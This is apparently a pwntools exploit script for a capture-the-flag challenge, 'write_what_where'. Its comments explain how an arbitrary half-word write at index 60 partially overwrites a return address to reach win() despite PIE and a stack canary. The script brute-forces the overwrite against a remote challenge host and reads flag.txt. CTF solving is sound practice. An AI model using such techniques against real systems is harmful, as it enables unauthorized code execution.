#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("write_what_where")

gs = '''
b *vuln+145
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("0.cloud.chals.io", 16612)
    else:
        return process(elf.path)

# Plan: We have an arbitrary write and there is a win() function. The binary has ALL security mechanisms enabled.
# The arbitrary write: We can specify both the index and value of vulnbuf, so we are going to find the offset
# to the return addr in the vuln() and then overwrite it with the offset to win (since PIE is enabled) and
# without touching the canary.

# The offset from index 0 of vulnbuf to the return addr in vuln() is 120. Next up we have to figure out if it
# we are jumping 2 every time we increase the index by 1. I Think it is because it is a half word array, meaning
# that every index holds 16-bits or 2 byte.
# So we have to write to index: 120/2 = 60 which is the retn addr. We can overwrite the 2 least significant bytes
# which is enough since they are the offset when PIE is enabled

# Find the offset from where ret normally jumps to and the addr of win().
# # normally jumps to main+108 


# Addresses

# Functions
for i in range(255): # We only use i for iteration
    print(i)
    try:
        io = start()

        io.recvline(b"Write-What-Where:")

        p = "60"
        io.sendline(p)
        sleep(0.1)

        #io.sendline(p1)
        io.sendline("21314")
        sleep(0.1)
        
        io.sendline(b"")
        io.sendline(b"cat flag.txt")

        recv = io.recvline(timeout=0.2)

        if b"udctf" in recv: # udctf
            print("recv1:")
            print(recv)
            break

        io.sendline(b"")
        io.sendline(b"cat flag.txt")

        recv = io.recvline(timeout=0.2)

        if b"udctf" in recv:
            print("recv2:")
            print(recv)
            break

        io.sendline(b"")
        io.sendline(b"cat flag.txt")

        recv = io.recvline(timeout=0.2)

        # This one gets remote
        if b"udctf" in recv:
            print("recv3:")
            print(recv)
            break
        else:
            io.close()


    except EOFError:
        io.close()  # Close the current connection and restart


